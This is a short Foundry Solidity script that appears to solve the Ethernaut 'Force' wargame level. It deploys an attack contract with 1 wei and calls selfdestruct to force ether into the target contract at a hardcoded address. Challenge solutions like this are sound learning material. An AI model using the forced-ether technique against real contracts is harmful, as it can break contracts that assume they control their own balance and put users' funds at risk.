// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Force.sol";

contract Level7Script is Script {
    Force force = Force(payable(0x5EBcc1A7351B0e2676A8C0d10eCdf5bDeeA8eDe5));

    function run() public {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        AttackContract attackContract = new AttackContract{value: 1 wei}();
        attackContract.pwn();

        vm.stopBroadcast();
    }
}

contract AttackContract {
    Force force = Force(payable(0x5EBcc1A7351B0e2676A8C0d10eCdf5bDeeA8eDe5));

    constructor() payable {}

    function pwn() public payable {
        selfdestruct(payable(address(force)));
    }

    receive() external payable {}
}
